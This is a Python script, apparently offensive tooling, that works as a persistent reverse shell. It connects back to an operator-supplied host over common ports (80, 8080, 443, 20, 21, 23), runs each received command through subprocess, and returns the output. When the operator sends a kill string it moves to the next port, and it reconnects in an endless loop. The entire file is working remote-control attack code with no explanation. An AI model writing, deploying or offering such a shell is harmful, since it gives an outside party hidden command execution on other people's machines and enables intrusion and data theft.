import socket
import subprocess
import sys
import time
import os

HOST = sys.argv[1]
ports = [80, 8080, 443, 20, 21, 23]
PORT = ports[0]
BUFFER = 1024

KILLSTRING = "endme"


def nextPort(p):
	global ports
	i = ports.index(p)
	if i == 5:
		return ports[0]
	return ports[i+1]
	

open_conn = False
while True:
	try:
		if not open_conn:
			s = socket.socket()
			print("Trying to connect")
			s.connect((HOST, PORT))
			print("Connected")
			open_conn = True
			
		cmd = s.recv(BUFFER).decode()
		
		if cmd == KILLSTRING:
			print("Ending")
			open_conn = False
			s.close()
			PORT = nextPort(PORT)
			time.sleep(1)
		else:
			if "cd" in cmd:
				try:
					os.chdir(cmd[3::])
					rsp = "Currently in" + str(os.getcwd())
				except:
					rsp = "No such directory"
			else:
				rsp = subprocess.getoutput(cmd)
			s.send(rsp.encode())
	except Exception as e:
		open_conn = False
		time.sleep(5)
